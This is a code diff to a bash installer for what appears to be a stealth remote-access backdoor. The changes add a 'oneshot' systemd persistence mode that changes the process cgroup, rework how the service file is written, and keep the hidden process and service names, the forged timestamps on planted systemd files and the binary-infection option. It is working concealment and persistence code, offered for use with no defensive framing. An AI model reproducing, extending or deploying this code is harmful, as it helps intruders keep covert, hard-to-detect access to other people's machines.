@@ -161,10 +161,14 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 # ~/.config/<NAME>
 CONFIG_DIR_NAME="mc"
 
-GS_INFECT=1
+# GS_INFECT=1
+
+GS_SYSTEMD_PERSIST="oneshot"
+#GS_SYSTEMD_PERSIST="default"
 [[ -n $GS_NOINFECT ]] && unset GS_INFECT
 GS_FFPID=1
 [[ -n $GS_NOFFPID ]] && unset GS_FFPID
+unset SYSTEMD_INSTALL_CHECK_IS_ACTIVE
 
 # systemd candidates for binary infection
 # res=$(command -v dbus-daemon) && {
@@ -1237,7 +1241,7 @@ config2bin() {
 		cp -p "${src}" "${dst}" || return 255
 	}
 
-	TERM=xterm-256color GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
+	TERM=xterm-256color GS_CCG="${GS_CCG}" GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
 	[[ -n "$dst_final" ]] && {
 		cat "${dst}" >"${dst_final}"
 		rm -f "${dst:?}"
@@ -1359,8 +1363,10 @@ do_config2bin() {
 	OK_OUT
 }
 
-install_systemd_new() {
-	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilq" "${PROC_HIDDEN_NAME}" || return 255
+install_systemd_add() {
+	local sfdata="$1"
+	local param="$2"
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || return 255
 
 	printf "%-70.70s" "Installing as systemd ${SERVICE_HIDDEN_NAME}.service.............................................."
 
@@ -1376,16 +1382,7 @@ install_systemd_new() {
 	# Create the service file
 	mk_file "${SERVICE_FILE}" || return 255
 	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
-	echo "[Unit]
-After=network.target
-
-[Service]
-Restart=always
-RestartSec=300
-ExecStart=${DSTBIN}
-
-[Install]
-WantedBy=multi-user.target" >"${SERVICE_FILE}" || return 255
+	echo "${sfdata}" >"${SERVICE_FILE}" || return 255
 
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
@@ -1398,6 +1395,38 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}" || return 255
 	OK_OUT
 }
 
+install_systemd_new() {
+	local sfdata
+	local param
+
+	if [[ "$GS_SYSTEMD_PERSIST" == *"oneshot"* ]]; then
+		sfdata="[Unit]
+After=network.target
+
+[Service]
+Type=oneshot
+RemainAfterExit=no
+ExecStart=${DSTBIN}"
+		param="-ilqD"
+		GS_CCG=1 # Change CGROUP
+	else 
+		# HERE: the default is a systemd supervised service
+		sfdata="[Unit]
+After=network.target
+
+[Service]
+Restart=always
+RestartSec=300
+ExecStart=${DSTBIN}
+
+[Install]
+WantedBy=multi-user.target"
+		param="-ilq"
+		SYSTEMD_INSTALL_CHECK_IS_ACTIVE=1
+	fi
+
+	install_systemd_add "$sfdata" "$param"
+}
 
 # infect cron.services et.al.
 install_systemd_infect() {
@@ -1884,8 +1913,8 @@ install()
 
 gs_start_systemd()
 {
+	local err
 	# HERE: It's systemd
-
 	[[ -n "$IS_GS_RUNNING" ]] && {
 		SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
 		return
@@ -1906,11 +1935,19 @@ gs_start_systemd()
 	# is needed. Thus fix Timestamp here and reload.
 	clean_all
 	systemctl daemon-reload
-	systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+	err=1
+	systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null && {
+		if [[ -n "$SYSTEMD_INSTALL_CHECK_IS_ACTIVE" ]]; then
+			systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null && unset err
+		else
+			# Hope for the best that OneShot worked correctly.
+			unset err
+		fi
+	}
+	[[ -n "$err" ]] && {
 		FAIL_OUT "Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN}."
 		exit_code 255
-	fi
+	}
 	IS_GS_RUNNING=1
 	OK_OUT
 	return
